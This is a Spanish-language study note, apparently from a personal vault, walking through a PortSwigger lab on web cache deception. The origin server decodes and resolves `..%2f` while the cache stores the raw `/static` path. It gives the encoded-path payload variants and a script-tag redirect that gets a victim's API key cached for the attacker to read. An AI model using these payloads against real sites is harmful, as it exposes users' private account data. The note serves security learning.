---
aliases:
  - WCD 003 - origin server normalization
  - cache deception origin normalization
tags:
  - vuln/web-cache-deception
  - example
  - portswigger
---

# 003 — Normalización en el ORIGEN (`..%2f`)

> Lab: [Exploiting origin server normalization](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization) · **Practitioner** · técnica → [[vulnerabilities/031-web-cache-deception/web-cache-deception|entry point]]

## Qué muestra
El **origen** **normaliza** el path (decodifica `%2f` → `/`, resuelve `..`) **antes** de enrutar; la **caché** **no** lo hace y guarda el path **tal cual**. Armás una URL que **parece** apuntar a un directorio/archivo estático (`/static/...`) pero que, tras la normalización del **origen**, **resuelve al endpoint dinámico** `/my-account`. La caché la cachea porque su key todavía "empieza" con `/static` (o termina en algo estático).

## Request → Response

> `GET `==`/static/..%2fmy-account`==` HTTP/1.1`
> `Host: victim.web-security-academy.net`
> `Cookie: session=<sesión de la víctima>`

**⬇️ el origen resuelve `..%2f` → `/static/../my-account` → `/my-account` (dinámico); la caché guarda por el prefijo `/static`:**

> `HTTP/1.1 200 OK` · `Cache-Control: max-age=30` · ==`X-Cache: miss`==
> `...Your API Key is: `==`<API KEY DE LA VÍCTIMA>`==`...`

## Por qué funciona
- **Origen (normaliza):** decodifica `%2f` a `/` y colapsa el `..` → `/static/../my-account` = `/my-account` → sirve la cuenta **dinámica** con datos.
- **Caché (no normaliza):** ve la URL cruda `/static/..%2fmy-account`; como su regla cachea todo lo de `/static/...`, la **guarda**.
- La discrepancia es **quién resuelve los dot-segments**: el origen sí, la caché no.

## Cómo encontrar la normalización (recon)
- Verificá que la caché cachea un **directorio estático** real: `GET /static/algo.js` → `X-Cache: hit`.
- Probá `..%2f` (y variantes: `%2e%2e%2f`, `..%2F`, `..\`) para "escapar" de `/static` hacia `/my-account`:
  ```
  /static/..%2fmy-account
  /static/%2e%2e%2fmy-account
  ```
- Buscá la variante que devuelve la **página de la cuenta (200 con datos)** → el origen la normalizó.

## Cómo explotarlo (weaponize)
1. Entregá el link a la víctima:
   ```
   <script>document.location="https://victim.web-security-academy.net/static/..%2fmy-account"</script>
   ```
2. La víctima autenticada lo abre → su respuesta privada queda cacheada bajo `/static/..%2fmy-account`.
3. Pedís vos la misma URL → `X-Cache: hit` → **leés la API key de la víctima**.

## Verificación
- La URL, pedida sin sesión, vuelve con ==`X-Cache: hit`== y los datos de la víctima.

## Detalles que se pasan por alto
- **`%2f` codificado es la clave** — si mandaras `/` crudo, la caché también vería `/static/../my-account` y quizá lo normalizaría igual que el origen (adiós discrepancia). Codificado, la caché lo deja quieto y el origen lo resuelve.
- **Este es el "origen normaliza".** El caso **inverso** (la **caché** normaliza y el origen no) es distinto → [[vulnerabilities/031-web-cache-deception/examples/004-cache-server-normalization|004]].
- Necesitás un **directorio/prefijo cacheado** (`/static`, `/assets`, `/resources`) del que "escapar".

→ Siguiente: [[vulnerabilities/031-web-cache-deception/examples/004-cache-server-normalization|004 · Normalización en la caché]]
